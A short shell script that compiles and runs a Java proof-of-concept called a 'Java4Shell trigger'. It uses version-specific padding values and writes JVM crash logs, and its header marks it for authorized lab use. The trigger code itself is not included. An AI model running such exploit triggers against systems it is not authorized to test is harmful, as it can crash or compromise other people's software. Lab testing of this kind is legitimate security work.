#!/bin/sh
# Compile and run the Java4Shell trigger with a collected JVM error file.
# AUTHORIZED LAB USE ONLY. Usage: ./run.sh [pad]   (64 for JDK 21/25/27, 128 for JDK 17)
set -e
cd "$(dirname "$0")"
mkdir -p /var/log/jvm 2>/dev/null || true
echo "[*] JDK in use:"; java -version
javac Base64Trigger.java
PAD="${1:-64}"
echo "[*] triggering with pad=$PAD ..."
exec java -XX:ErrorFile=/var/log/jvm/hs_err_pid%p.log Base64Trigger "$PAD"
